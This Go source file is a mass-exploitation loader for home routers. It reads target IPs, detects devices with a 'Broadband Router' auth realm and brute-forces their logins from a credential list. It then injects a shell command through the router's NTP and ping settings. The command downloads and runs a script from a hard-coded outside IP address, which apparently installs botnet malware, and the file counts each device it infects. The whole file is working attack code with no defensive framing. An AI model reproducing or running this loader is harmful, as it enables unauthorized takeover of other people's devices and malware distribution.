package main

import (
	"fmt"
	"strings"
	"net"
	"bufio"
	"os"
	"sync"
	"time"
	"io/ioutil"
	"unicode"
	"encoding/base64"
)

/*
Hello skid how are you sir

Dork
WWW-Authenticate: Basic realm=\"Broadband Router\"
*/

var syncWait sync.WaitGroup
var totalFound, totalAuthed, totalVuln int

var execPayload string = "$(wget%20http://23.94.21.78/.Samael/ur0a.sh;chmod%20+x%20ur0a.sh;sh%20ur0a.sh)"
var execTrigger string = "ps|grep -|sh" // no longer than 13 chars
var httpLogins []string
var loginsLen int

func isASCII(s string) bool {

    for i := 0; i < len(s); i++ {
        if s[i] > unicode.MaxASCII {
            return false
        }
    }

    return true
}

func deviceRunPing(target string, auth string, session string, ping string) bool {

	conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
	if err != nil {
		return false
	}

	defer conn.Close()
	conn.Write([]byte("GET /pingHost.cmd?action=add&targetHostAddress=" + ping + "&sessionKey=" + session + " HTTP/1.1\r\nHost: " + target + "\r\nAuthorization: Basic " + auth + "\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html\r\nReferer: http://" + target + "/ping.html\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\r\nConnection: close\r\n\r\n"))
	
	for {
		bytebuf := make([]byte, 256)
		rdlen, err := conn.Read(bytebuf)
		if err != nil || rdlen <= 0 {
			return false
		}
		
		if strings.Contains(string(bytebuf), "COMPLETED") {
			return true
		}
	}

	return false
}

func deviceLoadNtp(target string, auth string, session string, ntp string) bool {

	conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
	if err != nil {
		return false
	}

	defer conn.Close()
	conn.Write([]byte("GET /sntpcfg.cgi?ntp_enabled=1&ntpServer1=" + ntp + "&ntpServer2=&ntpServer3=&ntpServer4=&ntpServer5=&timezone_offset=-05:00&timezone=XXX+5YYY,M3.2.0/02:00:00,M11.1.0/02:00:00&tzArray_index=13&use_dst=0&sessionKey=" + session +" HTTP/1.1\r\nHost: " + target + "\r\nAuthorization: Basic c3VwcG9ydDpzdXBwb3J0\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html\r\nReferer: http://" + target + "/sntpcfg.html\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\r\nConnection: close\r\n\r\n"))
	
	bytebuf := make([]byte, 256)
	rdlen, err := conn.Read(bytebuf)
	if err != nil || rdlen <= 0 {
		return false
	}

	return true
}

func deviceContainsVuln(target string, auth string) string {

	conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
	if err != nil {
		return ""
	}

	defer conn.Close()
	conn.Write([]byte("GET /ping.html HTTP/1.1\r\nHost: " + target + "\r\nAuthorization: Basic " + auth + "\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html\r\nReferer: http://" + target + "/menu.html\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\r\nConnection: close\r\n\r\n"))
	
	for {
		bytebuf := make([]byte, 256)
		rdlen, err := conn.Read(bytebuf)
		if err != nil || rdlen <= 0 {
			return ""
		}
			
		if strings.Contains(string(bytebuf), "pingHost.cmd") && strings.Contains(string(bytebuf), "&sessionKey=") {
			index1 := strings.Index(string(bytebuf), "&sessionKey=")
			index2 := strings.Index(string(bytebuf)[index1+len("&sessionKey="):], "';")
			
			sessionKey := string(bytebuf)[index1+len("&sessionKey="):index1+len("&sessionKey=")+index2]
			if isASCII(sessionKey) {
				return sessionKey
			} else {
				return ""
			}
		}
	}

	return ""
}

func deviceGrabModel(target string, auth string) string {

	conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
	if err != nil {
		return ""
	}

	defer conn.Close()
	conn.Write([]byte("GET /backupsettings.conf HTTP/1.\r\nHost: " + target + "\r\nAuthorization: Basic " + auth + "\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html\r\nReferer: http://" + target + "/menu.html\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\r\nConnection: close\r\n\r\n"))

	for {
		bytebuf := make([]byte, 256)
		rdlen, err := conn.Read(bytebuf)
		if err != nil || rdlen <= 0 {
			break
		}
		
		if strings.Contains(string(bytebuf), "<ModelName>") && strings.Contains(string(bytebuf), "</ModelName>") {
			index1 := strings.Index(string(bytebuf), "<ModelName>")
			index2 := strings.Index(string(bytebuf), "</ModelName>")
			model := string(bytebuf)[index1+len("<ModelName>"):index2]

			if isASCII(model) {
				return model
			}
		}
	}

	return ""
}

func deviceAuthentication(target string) string {

	for i := 0; i < loginsLen; i++ {
		conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
		if err != nil {
			return ""
		}

		b64Auth := base64.StdEncoding.EncodeToString([]byte(httpLogins[i]))
		conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nCache-Control: max-age=0\r\nAuthorization: Basic " + b64Auth + "\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\r\nConnection: close\r\n\r\n"))

		bytebuf := make([]byte, 64)

		rdlen, err := conn.Read(bytebuf)
		if err != nil || rdlen <= 0 {
			conn.Close()
			return ""
		}

		conn.Close()

		if strings.Contains(string(bytebuf), "HTTP/1.1 200 Ok\r\nServer: micro_httpd") {
			totalAuthed++
			return b64Auth
		}

		time.Sleep(1 * time.Second)
	}

	return ""
}

func deviceVerification(target string) bool {

	conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
	if err != nil {
		return false
	}

	conn.Write([]byte("GET / HTTP/1.1\r\n\r\n"))

	bytebuf := make([]byte, 158)

	rdlen, err := conn.Read(bytebuf)
	if err != nil || rdlen <= 0 {
		conn.Close()
		return false
	}

	conn.Close()

	splitstr := strings.Split(string(bytebuf), "\r\n")

	if len(splitstr) != 5 {
		return false
	}

	if splitstr[0] != "HTTP/1.1 401 Unauthorized" {
		return false
	} else if splitstr[4] != "WWW-Authenticate: Basic realm=\"Broadband Router\"" {
		return false
	} else {
		totalFound++
		return true
	}
}

func loaderFunc(target string) {

	defer syncWait.Done()

	if deviceVerification(target) == false {
		return
	}

	auth := deviceAuthentication(target)
	if auth == "" {
		return
	}

	if deviceLoadNtp(target, auth, deviceContainsVuln(target, auth), execPayload) == false {
		return
	}

	if deviceRunPing(target, auth, deviceContainsVuln(target, auth), ";ps|sh") == false {
		return
	}

	if deviceLoadNtp(target, auth, deviceContainsVuln(target, auth), "time.nist.gov") == false {
		return
	}

	totalVuln++
	return
}

func main() {

	go func() {
		i := 0

		for {
			fmt.Printf("%ds | Found %d | Auth %d | Payloaded %d\r\n", i, totalFound, totalAuthed, totalVuln)
			i++
			time.Sleep(1 * time.Second)
		}
	} ()

    content, err := ioutil.ReadFile("logins.txt")
    if err != nil {
    	return
    }

    httpLogins = strings.Split(string(content), "\n")
    loginsLen = len(httpLogins)

    for {
        r := bufio.NewReader(os.Stdin)
        scan := bufio.NewScanner(r)
        for scan.Scan() {
        	syncWait.Add(1)
            go loaderFunc(scan.Text() + ":" + os.Args[1])
        }
    }

}
